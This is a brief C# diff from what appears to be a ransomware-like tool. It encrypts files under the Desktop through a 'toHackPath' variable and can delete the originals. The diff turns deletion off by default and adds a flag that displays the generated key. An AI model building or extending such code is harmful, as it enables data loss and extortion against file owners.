@@ -10,7 +10,9 @@
              * 
              */
 
-            bool deleteFiles = true; // Set to true if you want to delete the original files after encryption
+            bool deleteFiles = false; // Set to true if you want to delete the original files after encryption
+
+            bool showKey = false; // Set to true if you want to display the generated key
 
             string filePath = Environment.GetFolderPath(System.Environment.SpecialFolder.Desktop);
 
@@ -20,7 +22,7 @@
 
             Console.WriteLine("Start...");
 
-            Crypt crypt = new Crypt(toHackPath, deleteFiles);
+            Crypt crypt = new Crypt(toHackPath, deleteFiles, showKey);
 
             crypt.EncryptFolder(vaultPath);
 
